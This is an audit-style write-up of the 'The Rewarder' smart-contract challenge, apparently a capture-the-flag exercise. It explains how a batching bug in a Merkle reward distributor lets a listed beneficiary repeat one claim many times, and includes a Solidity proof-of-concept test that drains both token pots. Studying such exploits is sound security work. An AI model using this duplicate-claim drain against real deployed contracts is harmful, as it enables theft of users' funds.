## title

Duplicate claims in `claimRewards` allow full drain of the distributor due to per-token-group bookkeeping

## severity

**High.** Anyone with a valid Merkle proof can empty both distributions in one transaction. No special access is needed — just being listed on the tree. Once the transaction lands, the funds are gone.

## vulnerability details

- `claimRewards` takes an array of claims and loops through them one by one. On each iteration it verifies the Merkle proof and transfers tokens to the caller. So the payout runs _every iteration_.

- But the "already claimed?" check (`_setClaimed`) doesn't. It only runs when the token changes between iterations, or on the last iteration. So the bookkeeping runs _once per token group_.

- That mismatch is the bug — payout happens more often than bookkeeping.

- Three things make it exploitable:

1. **Merkle proofs never expire.** The same proof is valid every time it's checked. Nothing tracks "used."
2. **The bitmap only stores yes/no.** It can't count how many times a batch was claimed — a bit is either 0 or 1.
3. **The duplicate check only looks at what's already saved.** When `_setClaimed` finally runs, it compares against stored history — not against what happened earlier in the same call.

- So if a beneficiary submits the same claim many times in one call, each iteration verifies the same proof, transfers the tokens, and adds to an internal accumulator. When `_setClaimed` fires at the end of the token group, it just sees "one bit to set, no conflict" and approves it. Payout happened N times, but the bitmap only records it once.

- Grouping matters. Duplicates for the same token must be next to each other in the array. Interleaving them (like `[DVT, WETH, DVT, WETH]`) would make `_setClaimed` fire between iterations, and the second DVT flush would see batch 0 already marked and revert.

## impact

- Any listed beneficiary can drain the full DVT and WETH pots in one transaction.
- For this deployment: about 10 ether of DVT and 1 ether of WETH are extractable in a single call, leaving only tiny dust behind.
- Two protocol invariants are broken:
  - "A user can claim each (token, batch) pair at most once."
  - "Total successful claims for a token can't exceed what was funded."
- Once the transaction is mined, the loss is permanent.

## proof of concept

This test placed in the challenge file passes and drains both pots to `recovery`:

​```solidity
function test_theRewarder() public checkSolvedByPlayer {
// 1. Read raw rewards to find the player's index and allocation
Reward[] memory dvtRewards = abi.decode(
vm.parseJson(vm.readFile(string.concat(vm.projectRoot(), "/test/the-rewarder/dvt-distribution.json"))),
(Reward[])
);
Reward[] memory wethRewards = abi.decode(
vm.parseJson(vm.readFile(string.concat(vm.projectRoot(), "/test/the-rewarder/weth-distribution.json"))),
(Reward[])
);

    uint256 playerDvtIndex;
    uint256 playerDvtAmount;
    for (uint256 i = 0; i < dvtRewards.length; i++) {
        if (dvtRewards[i].beneficiary == player) {
            playerDvtIndex = i;
            playerDvtAmount = dvtRewards[i].amount;
            break;
        }
    }

    uint256 playerWethIndex;
    uint256 playerWethAmount;
    for (uint256 i = 0; i < wethRewards.length; i++) {
        if (wethRewards[i].beneficiary == player) {
            playerWethIndex = i;
            playerWethAmount = wethRewards[i].amount;
            break;
        }
    }

    // 2. Rebuild leaves and compute proofs
    bytes32[] memory dvtLeaves = _loadRewards("/test/the-rewarder/dvt-distribution.json");
    bytes32[] memory wethLeaves = _loadRewards("/test/the-rewarder/weth-distribution.json");
    bytes32[] memory dvtProof = merkle.getProof(dvtLeaves, playerDvtIndex);
    bytes32[] memory wethProof = merkle.getProof(wethLeaves, playerWethIndex);

    // 3. Compute how many duplicate claims fit in each pot
    uint256 dvtRepeats = distributor.getRemaining(address(dvt)) / playerDvtAmount;
    uint256 wethRepeats = distributor.getRemaining(address(weth)) / playerWethAmount;

    // 4. Build the claims array — DVT duplicates first, then WETH duplicates
    IERC20[] memory tokens = new IERC20[](2);
    tokens[0] = IERC20(address(dvt));
    tokens[1] = IERC20(address(weth));

    Claim[] memory claims = new Claim[](dvtRepeats + wethRepeats);
    for (uint256 i = 0; i < dvtRepeats; i++) {
        claims[i] = Claim({ batchNumber: 0, amount: playerDvtAmount, tokenIndex: 0, proof: dvtProof });
    }
    for (uint256 i = 0; i < wethRepeats; i++) {
        claims[dvtRepeats + i] = Claim({ batchNumber: 0, amount: playerWethAmount, tokenIndex: 1, proof: wethProof });
    }

    // 5. Drain both pots in one call
    distributor.claimRewards({ inputClaims: claims, inputTokens: tokens });

    // 6. Forward everything to recovery
    dvt.transfer(recovery, dvt.balanceOf(player));
    weth.transfer(recovery, weth.balanceOf(player));

}
​```

## Other observations (not the main exploit)

- `createDistribution` has no access control. Currently not exploitable because the
  caller must fund the distribution from their own balance (via `safeTransferFrom`),
  giving them no benefit. Flagged as a design concern rather than a vulnerability.
